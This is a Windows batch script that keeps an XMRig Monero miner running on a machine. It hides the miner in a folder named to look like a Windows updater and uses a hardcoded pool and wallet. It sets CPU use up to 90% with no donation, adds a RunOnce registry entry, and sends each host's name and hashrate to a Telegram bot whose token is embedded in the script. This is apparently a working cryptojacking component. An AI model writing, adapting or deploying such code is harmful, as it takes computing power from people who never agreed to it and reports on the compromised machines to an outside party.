@echo off
setlocal enabledelayedexpansion

:: === Configuration ===
set "MUTEX_FILE=%TEMP%\xmrig_watchdog.lock"
set "XMRIG_PATH=C:\ProgramData\WindowsUpdater\xmrig.exe"
set "POOL=gulf.moneroocean.stream:10128"
set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
set "PASSWORD=%COMPUTERNAME%"
set "ALGO=rx/0"

:: Telegram
set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
set "TG_CHAT_ID=8112985977"

:: Setup lock cleanup on shutdown (only once)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "XMRIG_Cleanup" /t REG_SZ /d "cmd /c del %TEMP%\xmrig_watchdog.lock" /f >nul 2>&1

:: === Prevent multiple watchdogs from running ===
if exist "!MUTEX_FILE!" (
    echo [!] Watchdog already running. Exiting.
    exit /b
)
echo locked > "!MUTEX_FILE!"

:: === Main monitoring loop ===
:loop
tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
if errorlevel 1 (
    echo [*] XMRig not running. Launching miner...

    start /min "" "!XMRIG_PATH!" -o !POOL! -u !WALLET! -p !PASSWORD! -a !ALGO! -k --donate-level=0 --randomx-1gb-pages --threads=auto --cpu-priority=3 --max-cpu-usage=90 --print-time=60 --http-port=16000

    timeout /t 10 >nul
    for /f "tokens=* delims=" %%s in ('powershell -Command "(Invoke-WebRequest -UseBasicParsing http://127.0.0.1:16000/1/summary).Content"') do set "STATS=%%s"

    for /f "tokens=2 delims=:" %%H in ('echo !STATS! ^| findstr /i "hashrate"') do set "HASHRATE=%%H"
    for /f "tokens=2 delims=:" %%A in ('echo !STATS! ^| findstr /i "accepted"') do set "ACCEPTED=%%A"

    curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" ^
     -d "chat_id=!TG_CHAT_ID!" ^
     -d "text=⚠️ *XMRig restarted* on *!COMPUTERNAME!*`n💻 Hashrate:!HASHRATE!`n✅ Accepted Shares:!ACCEPTED!`n🕒 %date% %time%" ^
     -d "parse_mode=Markdown"
) else (
    echo [✔] XMRig is running. Checking again in 30 seconds...
)

timeout /t 30 >nul
goto loop
